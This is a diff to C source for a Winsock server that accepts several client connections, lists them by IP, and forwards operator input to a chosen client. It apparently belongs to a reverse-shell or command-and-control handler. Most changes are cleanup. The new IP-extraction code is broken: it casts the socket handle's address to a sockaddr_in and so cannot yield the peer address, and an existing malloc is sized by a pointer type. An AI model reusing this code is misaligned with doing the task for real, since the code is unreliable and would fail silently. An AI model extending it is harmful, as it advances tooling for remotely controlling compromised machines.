@@ -32,7 +32,6 @@ PTHREADDATA pDataArray[MAX_CLIENTS];
 DWORD dwThreadIdArray[MAX_CLIENTS];
 HANDLE hThreadArray[MAX_CLIENTS];
 int threadNbr = 0;
-int clientNbr = 0;
 PCLIENTINFO PClients[MAX_CLIENTS];
 
 void logprint(char *type, char *message)
@@ -83,7 +82,8 @@ int init_client_childprocess(CLIENTINFO *Client)
             memset(recvbuf, 0, 4096);
             recvbuf[0] = '\0';
             fgets(recvbuf, 4096, stdin);
-            if(strcmp(recvbuf, "background") == 10){
+            if (strcmp(recvbuf, "background") == 10)
+            {
                 iSendResult = send(Client->Socket, "", 2, 0);
                 memset(recvbuf, 0, 4096);
                 recvbuf[0] = '\0';
@@ -100,8 +100,6 @@ int init_client_childprocess(CLIENTINFO *Client)
             WSACleanup();
 
             PClients[Client->id] = NULL;
-            clientNbr--;
-            printf("CLIENTNBR-- %d\n", clientNbr);
 
             return 0;
         }
@@ -114,7 +112,6 @@ DWORD WINAPI init_client(LPVOID lpParam)
     PTHREADDATA pData;
     pData = (PTHREADDATA)lpParam;
     ClientSocket = accept(pData->Listener, NULL, NULL);
-    printf("\n>>New client\n");
     closesocket(pData->Listener);
 
     SOCKET listener = init_listener();
@@ -132,13 +129,14 @@ DWORD WINAPI init_client(LPVOID lpParam)
         {
             PClients[i] = malloc(sizeof(PCLIENTINFO));
             PClients[i]->id = i;
-            strcpy(PClients[i]->ip, "TEST");
+            struct sockaddr_in *pV4Addr = (struct sockaddr_in *)&ClientSocket;
+            struct in_addr ipAddr = pV4Addr->sin_addr;
+            inet_ntop(AF_INET, &ipAddr, PClients[i]->ip, INET_ADDRSTRLEN);
             PClients[i]->Socket = ClientSocket;
+            printf("\n>>New client connected - %s\n", PClients[i]->ip);
             break;
         }
     }
-    clientNbr++;
-    printf("CLIENTNBR++ %d\n", clientNbr);
 }
 
 void init_client_thread(PTHREADDATA pclientdata)
@@ -181,7 +179,7 @@ int menu()
             if (PClients[i] != NULL)
             {
                 trigger = 1;
-                printf("%d - %s.\n", PClients[i]->id, PClients[i]->ip);
+                printf("%d - %s\n", PClients[i]->id, PClients[i]->ip);
             }
         }
         if (trigger)
@@ -189,7 +187,8 @@ int menu()
             printf("Enter 0 to exit.\n");
             printf("Choose a client : ");
             scanf("%d", &choice);
-            if(choice != 0){
+            if (choice != 0)
+            {
                 init_client_childprocess(PClients[choice]);
             }
         }
